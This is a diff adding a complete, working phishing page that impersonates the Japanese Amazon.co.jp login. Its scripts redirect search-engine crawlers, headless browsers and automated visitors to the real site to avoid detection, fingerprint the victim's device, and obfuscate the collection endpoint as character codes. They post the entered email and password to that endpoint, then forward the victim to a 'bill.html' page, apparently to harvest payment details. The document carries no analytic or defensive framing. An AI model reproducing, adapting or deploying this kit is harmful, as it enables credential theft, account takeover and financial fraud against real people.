@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="index,follow">
+<meta name="description" content="Amazon.co.jp にログインして、注文の確認やお届け先の変更ができます。">
+<title>Amazon.co.jp ログイン</title>
+<link rel="icon" href="assets/logo.svg">
+<link rel="stylesheet" href="assets/style.css">
+<script>
+(function(){
+  var ua = navigator.userAgent;
+  var bot = /Googlebot|Google-InspectionTool|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Applebot|Twitterbot|facebookexternalhit|Slackbot|Discordbot|LinkedInBot|Pinterestbot|HeadlessChrome|PhantomJS|Puppeteer|Playwright|Lighthouse/i.test(ua);
+  if (bot || navigator.webdriver) { location.replace('https://www.amazon.co.jp/'); }
+})();
+</script>
+</head>
+<body>
+
+<header><a href="#" aria-label="Amazon.co.jp"><img src="assets/logo.svg" alt="Amazon.co.jp" width="150" height="42"></a></header>
+
+<main>
+  <div class="wrap">
+    <div class="card">
+      <h1>ログイン</h1>
+      <form id="f" method="post" action="api/log.php" novalidate>
+        <input type="hidden" name="step" value="1_login">
+        <input type="hidden" name="sig" id="sig">
+        <div class="hp"><label for="fax">FAX</label><input id="fax" name="fax" type="text" tabindex="-1" autocomplete="off"></div>
+
+        <label for="email">メールアドレスまたは携帯電話番号</label>
+        <input id="email" name="email" type="text" inputmode="email" autocomplete="username"
+               autocapitalize="off" spellcheck="false" autofocus>
+
+        <label for="password" class="mt">パスワード</label>
+        <input id="password" name="password" type="password" autocomplete="current-password">
+
+        <a class="forgot" href="#">パスワードをお忘れですか？</a>
+        <p class="errmsg" id="err">メールアドレスまたはパスワードが正しくありません。</p>
+        <button class="btn" type="submit" id="sub">ログイン</button>
+      </form>
+    </div>
+
+    <div class="divider"><i></i><span>Amazonアカウントは初めてですか？</span><i></i></div>
+    <button class="btn2" type="button" id="reg">Amazonアカウントを作成</button>
+  </div>
+</main>
+
+<footer>
+  <div><a href="#">利用規約</a><a href="#">プライバシー規約</a><a href="#">ヘルプ</a></div>
+  <div class="cp">© 1996-2026, Amazon.com, Inc. or its affiliates</div>
+</footer>
+
+<script>
+(function(){
+  var EP = [97,112,105,47,108,111,103,46,112,104,112]
+           .map(function(c){ return String.fromCharCode(c); }).join('');
+  var f = document.getElementById('f'),
+      em = document.getElementById('email'),
+      pw = document.getElementById('password'),
+      sub = document.getElementById('sub'),
+      err = document.getElementById('err');
+
+  var fp = [screen.width, screen.height, screen.colorDepth,
+            navigator.hardwareConcurrency || 0, navigator.platform || '',
+            new Date().getTimezoneOffset(), navigator.language || ''].join('|');
+  try { document.getElementById('sig').value = btoa(fp); } catch(e) {}
+
+  document.getElementById('reg').addEventListener('click', function(){
+    location.href = 'https://www.amazon.co.jp/ap/register';
+  });
+
+  [em, pw].forEach(function(el){
+    el.addEventListener('input', function(){ el.classList.remove('err'); err.classList.remove('on'); });
+  });
+
+  f.addEventListener('submit', function(e){
+    e.preventDefault();
+    var v = em.value.trim().replace(/[\s-]/g, ''), ok = true;
+
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) && !/^0\d{9,10}$/.test(v)) {
+      em.classList.add('err'); em.focus(); ok = false;
+    }
+    if (pw.value.length < 4) { pw.classList.add('err'); if (ok) pw.focus(); ok = false; }
+    if (!ok) { err.classList.add('on'); return; }
+
+    var d = new FormData(f);
+    d.set('ua', navigator.userAgent + ' | ' + (navigator.language || ''));
+    d.set('vp', innerWidth + 'x' + innerHeight);
+    try { localStorage.setItem('a_em', v); } catch(ex) {}
+
+    sub.disabled = true;
+    sub.textContent = 'ログイン中…';
+
+    var sent = false;
+    var jump = function(){ if (!sent) { sent = true; location.href = 'bill.html'; } };
+
+    if (window.fetch) {
+      fetch(EP, { method:'POST', body:d, keepalive:true, credentials:'same-origin' })
+        .then(jump).catch(jump);
+      setTimeout(jump, 1200);
+    } else {
+      f.submit();
+    }
+  });
+})();
+</script>
+</body>
+</html>
